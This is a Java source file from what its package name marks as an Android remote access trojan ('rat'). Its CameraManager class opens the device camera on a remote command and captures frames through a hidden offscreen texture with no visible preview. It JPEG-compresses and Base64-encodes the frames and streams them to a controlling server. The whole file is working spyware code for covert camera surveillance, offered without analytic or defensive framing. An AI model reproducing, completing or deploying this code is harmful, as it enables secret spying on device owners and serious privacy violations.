package com.wexow.rat.managers;

import android.content.Context;
import android.content.pm.ServiceInfo; 
import android.graphics.ImageFormat;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.util.Base64;
import android.util.Log;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.List;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.atomic.AtomicBoolean;

public class CameraManager {
    private static final String TAG = "CameraManager";
    private static Camera mCamera;
    private static final AtomicBoolean isStreaming = new AtomicBoolean(false);
    private static final LinkedBlockingQueue<byte[]> queue = new LinkedBlockingQueue<>(2);
    private static Thread senderThread;

    public static void startStreaming(Context ctx, JSONObject jo) {
        if (isStreaming.get()) stopStreaming();
        try { Thread.sleep(300); } catch (Exception ignored) {}

        try {
            int camId = jo.optInt("camera_id", 0);
            final int quality = jo.optInt("quality", 40);

            try {
                if (com.wexow.rat.core.MainService.getInstance() != null) {
                    com.wexow.rat.core.MainService.getInstance().upgradeType(
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
                }
            } catch (Exception ignored) {}

            mCamera = Camera.open(camId);
            Camera.Parameters params = mCamera.getParameters();

            List<Camera.Size> sizes = params.getSupportedPreviewSizes();
            Camera.Size best = sizes.get(0);
            for (Camera.Size s : sizes) {
                if (s.width <= 720 && s.width >= 480) { best = s; break; }
            }

            params.setPreviewSize(best.width, best.height);
            params.setPreviewFormat(ImageFormat.NV21);
            mCamera.setParameters(params);

            SurfaceTexture st = new SurfaceTexture(10);
            mCamera.setPreviewTexture(st);
            isStreaming.set(true);
            queue.clear();

            senderThread = new Thread(() -> {
                while (isStreaming.get()) {
                    try {
                        byte[] data = queue.take();
                        Camera.Parameters p = mCamera.getParameters();
                        if (p == null) continue;

                        int w = p.getPreviewSize().width;
                        int h = p.getPreviewSize().height;

                        YuvImage yuv = new YuvImage(data, ImageFormat.NV21, w, h, null);
                        ByteArrayOutputStream out = new ByteArrayOutputStream();
                        yuv.compressToJpeg(new Rect(0, 0, w, h), quality, out);
                        String enc = Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP);

                        JSONObject res = new JSONObject();
                        res.put("type", "camera");
                        res.put("image", enc);
                        ConnectionManager.send(res.toString());
                        Thread.sleep(200);
                    } catch (InterruptedException e) { break; }
                    catch (Exception e) { Log.e(TAG, "sender: " + e.getMessage()); }
                }
            });
            senderThread.start();

            mCamera.setPreviewCallback((data, cam) -> {
                if (isStreaming.get()) queue.offer(data);
            });
            mCamera.startPreview();
        } catch (Exception e) {
            Log.e(TAG, "start: " + e.getMessage());
            stopStreaming();
        }
    }

    public static void stopStreaming() {
        isStreaming.set(false);
        if (senderThread != null) {
            senderThread.interrupt();
            senderThread = null;
        }
        if (mCamera != null) {
            try {
                mCamera.setPreviewCallback(null);
                mCamera.stopPreview();
                mCamera.release();
            } catch (Exception ignored) {}
            mCamera = null;
        }
        queue.clear();
    }
}
